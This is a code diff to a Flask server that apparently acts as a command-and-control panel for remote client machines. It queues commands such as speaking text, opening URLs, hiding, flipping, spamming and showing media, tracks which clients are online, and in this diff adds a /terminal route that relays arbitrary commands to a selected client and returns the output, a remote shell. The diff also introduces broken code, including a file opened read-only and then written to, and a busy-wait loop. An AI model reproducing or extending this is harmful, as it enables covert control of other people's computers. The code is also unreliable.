@@ -10,8 +10,8 @@ firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
 startTime = time()
 spam = False
-selected_user = "93"
-image = None
+selected_user = "01"
+output = ""
 control_data = {}
 STATIC_FOLDER = os.path.join("static")
 if not os.path.exists(STATIC_FOLDER):
@@ -42,20 +42,14 @@ with open(state_file,"w") as file:
             "shareToggleState": {
             	"state": "off",
             	"color": "red"
-            },
-            "INToggleState": {
-            	"state": "off",
-            	"color": "red"
-            } 
+            }
         }
     json.dump(states, file, indent=4)			
 @app.route("/")
-def terminal():
+def root():
     global firstReload
     state_file = os.path.join(STATIC_FOLDER, "state.json")
     files = os.listdir(UPLOAD_FOLDER)
-    images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
-    videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
     tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
     state = None
     color = "red"
@@ -74,8 +68,6 @@ def terminal():
     fc = data1[selected_user]["flipToggleState"]["color"]
     shs = data1[selected_user]["shareToggleState"]["state"]
     shc = data1[selected_user]["shareToggleState"]["color"]
-    is1 = data1[selected_user]["INToggleState"]["state"]
-    ic = data1[selected_user]["INToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -89,13 +81,13 @@ def terminal():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,is1=is1,ic=ic,users=users,selected = selected)
+    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,users=users,selected = selected)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
     global spam
     if request.method == "POST":
-        message = request.form["text"]   
+        message = request.form["text"]  or request.get_data()
         with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
             if ("pLaY" not in message and "oPeN" not in message):    
                 file.write("sPeAk" + message)
@@ -165,7 +157,7 @@ def sounds():
 @app.route("/play", methods=["POST", "GET"])
 def play():
     if request.method == "POST":
-        file = request.form["audio"]
+        file = request.form["text"] or request.get_data()
         if file != "":
             try:
                 with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
@@ -199,7 +191,7 @@ def update():
 @app.route("/url", methods=["POST", "GET"])
 def url():
     if request.method == "POST":
-        url = request.form["url"]
+        url = request.form["url"] or request.get_data()
         with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
             file.write("oPeN " + url)
     return redirect("/")
@@ -293,13 +285,10 @@ def toggle():
             elif cmd == "sHaRe":
                 data[selected_user]["shareToggleState"]["state"] = state
                 data[selected_user]["shareToggleState"]["color"] = color
-            elif cmd == "bLoCk":
-                data[selected_user]["INToggleState"]["state"] = state
-                data[selected_user]["INToggleState"]["color"] = color            
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe" or cmd == "bLoCk":
+        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
@@ -339,11 +328,11 @@ def img():
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                 a.write("iMaGe " + file.filename)
     return redirect("/")
-    
+
 @app.route("/img",methods=["GET", "POST"])
 def display():
 	if request.method == "POST":
-		file = request.form["img"]
+		file = request.form["img"] or request.get_data()
 		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
 			a.write("iMaGe " + file)
 	return redirect("/")
@@ -351,11 +340,10 @@ def display():
 @app.route("/vid",methods=["GET", "POST"])
 def video():
 	if request.method == "POST":
-		file = request.form["vid"]
+		file = request.form["vid"] or request.get_data()
 		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
 			a.write("vIdEo " + file)	
 	return redirect("/")
-	
 @app.route("/logs",methods=["GET","POST"])
 def logs():
     global prevlog
@@ -367,7 +355,7 @@ def logs():
               
 
 @app.route("/output", methods=["POST", "GET"])
-def output():
+def output1():
     data = request.get_json()
     err = data["err"]
     user = data["user"]
@@ -406,10 +394,9 @@ def update_log():
 @app.route("/err",methods=["GET","POST"])
 def err():
     if request.method == "POST":
-        no = request.form["err"]
-        with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
+        no = request.form.get("err") or request.get_data()
+        with open(os.path.join(STATIC_FOLDER,"message.txt")) as file:
             file.write(f"eRr {no}")
-    return "done"		
 @app.route("/clear",methods=["POST","GET"])
 def clear():
     with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
@@ -460,6 +447,27 @@ def control():
         data1 = control_data
         control_data = {}
         return jsonify(data1)
-    
+@app.route("/terminal",methods=["GET", "POST"])
+def terminal():
+    global output
+    if request.method == "GET":
+        audios = os.listdir(os.path.join(STATIC_FOLDER,"sounds"))
+        images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
+        videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
+        return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
+    elif request.method == "POST":
+        cmd = request.get_json()
+        if cmd["input"]:
+            with open(os.path.join(STATIC_FOLDER,"message.txt"),"wt") as file:
+                file.write(cmd["input"])
+            while not output:
+                pass
+            shaktimaan = output
+            output = None
+            return jsonify(shaktimaan)
+        elif cmd["output"]:
+            output = cmd["output"]
+    return "done"
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
